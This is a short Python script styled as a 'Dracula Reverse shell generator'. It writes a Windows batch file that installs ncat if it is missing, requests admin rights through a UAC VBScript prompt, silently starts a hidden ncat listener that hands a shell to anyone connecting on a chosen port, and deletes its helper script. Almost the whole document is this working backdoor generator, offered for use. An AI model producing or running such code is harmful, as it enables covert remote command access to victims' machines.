import os
import subprocess


#adding the title ig
print("""

  _____                       _       
 |  __ \                     | |      
 | |  | |_ __ __ _  ___ _   _| | __ _ 
 | |  | | '__/ _` |/ __| | | | |/ _` |
 | |__| | | | (_| | (__| |_| | | (_| |
 |_____/|_|  \__,_|\___|\__,_|_|\__,_|
                                      
        Reverse shell generator   v1                                      

""")


def generate_and_execute_batch(port, shell):

    batch_script = f"""@echo off
:: To Check if Netcat is installed
where ncat >nul 2>&1
if %errorLevel% neq 0 (
    echo Ncat not found. Installing via winget...
    winget install -e --id Nmap.Nmap
)

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\\elevate.vbs"
    cscript "%temp%\\elevate.vbs"
    del "%temp%\\elevate.vbs"
    exit /b
)
::Initialise Var
set PORT={port}
set SHELL={shell}

:: Run the main command 
echo Waiting...
echo Set objShell = CreateObject("WScript.Shell") > run_silent.vbs
echo objShell.Run "ncat -l -p %PORT% -e %SHELL%", 0, False >> run_silent.vbs

:: Run the VBScript 
cscript //nologo run_silent.vbs

:: Clean up the VBScript after execution
del run_silent.vbs

exit
"""

    try:
        with open(batch_file_name+".bat", "w") as f:
            f.write(batch_script)

    except subprocess.CalledProcessError as e:
        print(f"Error executing batch script: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

print("[0] Generate Reverse shell file [1] Help [2] Exit")
main = input("Enter Choice>>> ")

if "0" in main:
    port_number = input("Enter the port number>>> ") 
    shell_type = input("Enter the shell >>> ")
    batch_file_name = input("Enter the name of the file>>> ")

    generate_and_execute_batch(port_number, shell_type)
elif "1" in main:
    print("Dracula generate a batch file(works only on windows)")
else:
    exit()